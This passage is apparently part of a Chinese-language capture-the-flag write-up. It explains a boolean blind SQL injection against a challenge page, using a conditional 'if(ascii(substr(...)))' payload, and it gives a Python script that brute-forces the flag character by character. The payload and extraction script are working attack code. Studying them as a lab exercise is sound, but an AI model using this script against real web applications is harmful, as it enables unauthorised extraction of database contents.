接下来就开始构造payload注入
题目已经告诉我们flag所在的表和列都为flag
我们构造如下payload惊醒测试
if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)--+
如果为真则返回id=1的结果，否则返回id=2的结果

如预期一样，回显了id=1的结果
剩下的就是构造盲注脚本了，脚本可以用二分法，这样快很多
不过我懒，选择暴力枚举，脚本如下

import requests
url="http://8c21b6a5-81a5-4dc0-ac52-8db6ef8583f4.node3.buuoj.cn/index.php"
flag=''

for i in range(1,50):
    for j in range(32,127):
        payload="if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"%(i,j)
        data={
            "id":payload
        }
        r=requests.post(url,data=data)
        if 'Hello' in r.text:
            flag+=chr(j)
            print(flag)
            break

print("flag为:",flag)
